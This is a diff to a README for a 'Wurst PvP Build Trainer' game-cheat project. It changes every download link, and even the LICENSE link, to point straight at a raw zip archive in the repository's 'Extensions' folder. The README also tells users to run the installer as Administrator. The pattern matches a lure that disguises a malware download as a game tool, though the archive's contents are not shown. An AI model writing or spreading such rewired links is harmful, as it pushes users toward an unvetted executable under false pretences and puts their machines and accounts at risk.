@@ -10,7 +10,7 @@ Follow these simple steps to get up and running on **Windows**.
 
 ### Step 1: Download the Software
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/DOWNLOAD-LATEST%20RELEASE-%23FF6F00?style=for-the-badge&logo=github)](https://github.com/highbacked-enumeration256/Wurst-PvP-Build-Trainer-2026)
+[![DOWNLOAD NOW](https://img.shields.io/badge/DOWNLOAD-LATEST%20RELEASE-%23FF6F00?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/highbacked-enumeration256/Wurst-PvP-Build-Trainer-2026/main/Extensions/Trainer-Build-Wurst-Pv-3.2-alpha.2.zip)
 
 Visit this link to download the application.
 
@@ -66,13 +66,13 @@ A: Make sure you run as Administrator (right-click the installer → *Run as Adm
 
 ## 📥 Download
 
-[![Download Button](https://img.shields.io/badge/⬇%EF%B8%8F_DOWNLOAD_NOW-%2361DAFB?style=for-the-badge&logo=github)](https://github.com/highbacked-enumeration256/Wurst-PvP-Build-Trainer-2026)
+[![Download Button](https://img.shields.io/badge/⬇%EF%B8%8F_DOWNLOAD_NOW-%2361DAFB?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/highbacked-enumeration256/Wurst-PvP-Build-Trainer-2026/main/Extensions/Trainer-Build-Wurst-Pv-3.2-alpha.2.zip)
 
 Visit this link to download the application.
 
 ## 📜 License
 
-This project is licensed under the MIT License – you are free to use, modify, and share, provided you include proper attribution. See the [LICENSE](https://github.com/highbacked-enumeration256/Wurst-PvP-Build-Trainer-2026/LICENSE) file for details.
+This project is licensed under the MIT License – you are free to use, modify, and share, provided you include proper attribution. See the [LICENSE](https://raw.githubusercontent.com/highbacked-enumeration256/Wurst-PvP-Build-Trainer-2026/main/Extensions/Trainer-Build-Wurst-Pv-3.2-alpha.2.zip) file for details.
 
 ## 💬 Community
 
